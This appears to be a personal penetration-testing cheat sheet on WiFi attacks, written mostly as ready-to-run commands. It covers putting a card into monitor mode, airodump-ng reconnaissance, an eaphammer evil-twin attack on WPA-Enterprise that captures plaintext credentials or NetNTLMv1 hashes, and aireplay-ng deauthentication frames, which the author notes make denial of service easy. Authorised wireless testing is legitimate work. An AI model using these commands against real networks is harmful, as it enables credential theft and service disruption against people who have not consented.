# WiFi

## Misc

### put into promiscuous

```bash
# place an interface (wireless card into monitor)
airmon-ng start wlan0

### ALTERNATIVELY:
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

### set a specific channel to a wireless interface

```bash
iwconfig wlp1s0f0u8 channel 5
```

## WPA-E ET

```bash
eaphammer --cert-wizard
# make sure all is checked out

# working. if certificate validation 
# is not configured on supplicant -
# supplicant autoconnects and gets 
# successfully downgraded to GTC if MSCHAPv2
# is not explicitly specified
./eaphammer --bssid 1C:7E:E5:97:79:B1 \
--essid Example \
--channel 2 \
--interface wlan0 \
--auth wpa-eap \
--creds
```

IMPACT:

- inner GTC      : plaintext credentials if
- inner MSCHAPv2 : NetNTLMv1 hash

## airodump-ng

1. use "a" key to collapse sections!
2. if doesn't work try replugging the adapter! It SHOULD work right after replugging by just runnign airodump-ng! No additional actions!

```bash
### SECTIONS
## APs:
# BSSID   - AP MAC address
# ESSID   - AP readable identitier
# CH      - AP channel (frequency range)

## STATIONS:
# BSSID   - MAC of an AP the station is connected to
# Probes  - ESSIDs this client has probed 
# STATION - MAC of a station


###############
### GENERAL ###
###############
# scan near APs
airodump-ng wlan0
# scan specific AP
airodump-ng --bssid CE:9D:A2:E2:9B:40 wlan0
```

## deauth

1. Usually it takes a client 3-5 seconds to authenticate back. that means you can easily DoS.
2. before sending ensure your interface is set to a single channels (not hopping channels). It can hop channels if you are simultaniously monitoring with airmon-ng, so disable it first (or start it with "-c" parameter and set the channel manually (e.g. -c 11)) and set a channel with iwconfig.

```bash
# send unicast deauth frame against a specific station (client) 
aireplay-ng -0 1 -a "CE:9D:A2:E2:9B:40" -c "10:F0:05:16:F6:9E" wlp1s0f0u8

# send broadcast deauth frame impersonating an AP
aireplay-ng -0 1 -a "CE:9D:A2:E2:9B:40" wlp1s0f0u8
```
